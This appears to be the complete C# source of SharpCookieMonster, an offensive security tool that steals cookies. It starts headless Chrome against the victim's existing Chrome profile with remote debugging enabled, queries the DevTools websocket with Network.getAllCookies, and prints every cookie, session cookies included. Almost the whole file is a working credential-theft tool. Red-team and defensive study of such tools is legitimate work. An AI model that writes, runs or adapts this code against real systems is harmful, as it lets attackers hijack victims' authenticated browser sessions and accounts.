using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using WebSocket4Net;
using DataReceivedEventArgs = System.Diagnostics.DataReceivedEventArgs;

namespace SharpCookieMonster
{
    public static class Program
    {
        private const string BANNER = @"
                                                                              
                                                                                
                                                                                
                                       .&@#.  .#@@.                             
                      *&&((&@(       @/            *@                           
                   @            &( ,&  &@@@@/        &/                         
                 @                &@  @@@@@@@@        @.                        
                @.         #@@/    @  @@@@@@@/        @,      #@@               
                @        @@@@@@@@  &&                %%/(%%&#//(#...            
                /%       @@@@@@@@ *#(@*            ,@/(((//(/(/(((//(@.         
            .@(..#@,       %@@#  &/////#@@*.  .*&@#////////////////(/&@.        
            (&%((///(@(.     *&#(//(/////((//(/(((///(/(/(/(/(/(///////((%@     
        (@#//((/////((//(/(////(///////////////////////////////////@#/(/&@.     
       @&@@////(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/((///(@%//////(#@    
  %@@%(////////////////////////////((//(@@@#///@@%#///((&@@@@@@#////////(#&&(   
   @@&(///(//(/(/(//((/(///(///(//@//&@@@@@@@@@@@@@@@@@@@@@@@@(////(/(////#@@@/ 
    @#/(&&(////(///((@///%@(##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///////////%@@@&. 
   @#(/(#%@@&(//#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///(/(/(/(//@.    
   @#/(//(//(//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@////(/////(//@.    
   ,@&///(/(/(///%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#(///(/(///#/&@     
     @&((//////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%///////////%&,      
      #@/(/(/(/(////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@((/(/(/(/(/((@.       
       &(/////////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#////////////((&        
      .@(%@(///(/(/(////%@@@@@@@@@@@@@@@@@@@@@@@@@@@@&/(/(/(/(///(//#@%@.       
       .**.@/(/////////////(@@@@@@@@@@@@@@@@@@@@@@(///////////////(@/           
            @%((///(/(/(/(/////(/#&@@@@@@@@%((///(///(/(///((/(@/@&.            
             ,&@@(//////////////(////(((//((//(((////////////@(.                
                ,@@(/////////////(/(/(/(/(/(/(/(/(///((&%%@%,                   
                  .%@@(@@@#&@&(/////////////////////&@*                         
                          ,*, ,@@@@@@@@&&&&@@%/, ..                             
                                                                                
                                                                              ";

        private static void Main(string[] args)
        {
            Console.WriteLine(BANNER);
            Console.WriteLine("                     SharpCookieMonster v1.0 by @m0rv4i\n");
            if (args.Length == 1 && (args[0] == "-h" || args[0] == "--help"))
            {
                Console.WriteLine("[*] SharpCookieMonster.exe [url] [chrome-debugging-port] [user-data-dir]");
                return;
            }

            var url = "https://www.google.com";
            if (args.Length >= 1)
            {
                url = args[0];
                Console.WriteLine("[*] Accessing site: " + url);
            }

            var port = 9142;
            if (args.Length >= 2)
            {
                port = int.Parse(args[1]);
                Console.WriteLine("[*] Using chrome debugging port: " + port);
            }

            var userdata = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data";
            if (args.Length == 3)
            {
                userdata = args[2];
            }

            Console.WriteLine("[*] Using data path: " + userdata);
            var chrome = LaunchChromeHeadless(url, userdata, port);
            if (chrome == null)
            {
                // Ain't running - no point in continuing
                return;
            }

            string cookies;
            try
            {
                cookies = GrabCookies(port);
            }
            finally
            {
                Cleanup(chrome);
            }

            if (string.IsNullOrEmpty(cookies))
            {
                Console.WriteLine("[-] No response or could not connect");
            }
            else if (!cookies.Contains("\"name\""))
            {
                Console.WriteLine("[-] Query successful but no cookies returned :(");
            }
            else
            {
                Console.WriteLine("[+] Cookies! OM NOM NOM\n\n");
                var pretty = cookies.Trim();
                pretty = pretty.Replace("{\"id\":1,\"result\":{\"cookies\":", "");
                pretty = pretty.Replace("}]}}", "}]");
                pretty = pretty.Replace(",", ",\n");
                pretty = pretty.Replace("},", "\n},");
                pretty = pretty.Replace("}]", "\n}\n]\n");
                pretty = pretty.Replace("{", " \n{\n");
                pretty = pretty.Replace("\n\"", "\n\t\"");
                pretty = pretty.Substring(0, pretty.LastIndexOf("]", StringComparison.Ordinal) + 1);
                Console.WriteLine(pretty);
            }
        }

        private static void LogData(object sender, DataReceivedEventArgs args)
        {
            Console.WriteLine("[*][Chrome] {0}", args.Data);
        }

        private static Process LaunchChromeHeadless(string url, string userdata, int port)
        {
            var chrome = new Process();
            var chromes = Process.GetProcessesByName("chrome");
            var path = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
            if (chromes.Length == 0)
            {
                Console.WriteLine("[*] No chrome processes running, defaulting binary path to: " + path);
            }
            else
            {
                // Get the filepath of a running chrome process
                path = chromes[0].MainModule?.FileName;
            }

            chrome.StartInfo.UseShellExecute = false;
            chrome.StartInfo.FileName = path;
            chrome.StartInfo.Arguments = $"\"{url}\" --headless --user-data-dir=\"{userdata}\" --remote-debugging-port={port} --remote-allow-origins=ws://localhost:{port}";
            chrome.StartInfo.CreateNoWindow = true;
            chrome.OutputDataReceived += LogData;
            chrome.ErrorDataReceived += LogData;
            chrome.StartInfo.RedirectStandardOutput = true;
            chrome.StartInfo.RedirectStandardError = true;
            chrome.Start();
            chrome.BeginOutputReadLine();
            chrome.BeginErrorReadLine();
            var pid = chrome.Id;
            Thread.Sleep(1000);
            try
            {
                Process.GetProcessById(pid);
            }
            catch (ArgumentException)
            {
                Console.WriteLine("[-] Launched chrome process is not running...will try connecting to port anyway");
            }

            Console.WriteLine("[*] Started chrome headless process: " + pid);
            if (WaitForPort(port)) return chrome;
            Console.WriteLine("[-] Timed out waiting for debug port to open...");
            return null;
        }

        private static string GrabCookies(int port)
        {
            using (var webClient = new WebClient())
            {
                var regex = new Regex($"\"webSocketDebuggerUrl\":\\s*\"(ws://localhost:{port}/.*)\"");
                var response = webClient.DownloadString($"http://localhost:{port}/json");
                var match = regex.Match(response);
                if (!match.Success)
                {
                    Console.WriteLine("[-] Could not extract debug URL from chrome debugger service");
                    return null;
                }

                var debugUrl = match.Groups[1].Value;
                const string cookiesRequest = "{\"id\": 1, \"method\": \"Network.getAllCookies\"}";
                Console.WriteLine("[*] Retrieved debug url: " + debugUrl);
                return WebSocketRequest35(debugUrl, cookiesRequest);
            }
        }


        private static void Cleanup(Process chrome)
        {
            try
            {
                if (chrome == null) return;
                chrome.ErrorDataReceived -= LogData;
                chrome.OutputDataReceived -= LogData;
                Console.WriteLine("[*] Killing process " + chrome.Id);
                Process.GetProcessById(chrome.Id).Kill();
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error killing chrome process with pid {0}: {1}", chrome?.Id, e);
            }
        }


        private static string WebSocketRequest35(string server, string data)
        {
            var result = "";
            var dataReceived = false;
            var websocket = new WebSocket(server);
            websocket.MessageReceived += WebsocketMessageReceived;
            websocket.Opened += WebsocketOpened;
            websocket.Open();
            var start = DateTime.Now;
            var now = DateTime.Now;
            while (!dataReceived && now.Subtract(start).TotalMilliseconds < 30000) // 30s timeout
            {
                Thread.Sleep(500);
            }

            return result;

            void WebsocketOpened(object sender, EventArgs e)
            {
                websocket.Send(data);
            }

            void WebsocketMessageReceived(object sender, MessageReceivedEventArgs e)
            {
                result += e.Message;
                dataReceived = true;
            }
        }

        private static bool WaitForPort(int port)
        {
            Console.WriteLine($"[*] Waiting for debugger port {port} to open...");
            var start = DateTime.Now;
            var now = DateTime.Now;
            while (now.Subtract(start).TotalMilliseconds < 30000) // 30s timeout
            {
                using (var tcpClient = new TcpClient())
                {
                    try
                    {
                        tcpClient.Connect("127.0.0.1", port);
                        Console.WriteLine("[+] Debugger port open");
                        return true;
                    }
                    catch (Exception)
                    {
                        Thread.Sleep(500);
                        now = DateTime.Now;
                    }
                }
            }

            return false;
        }
    }
}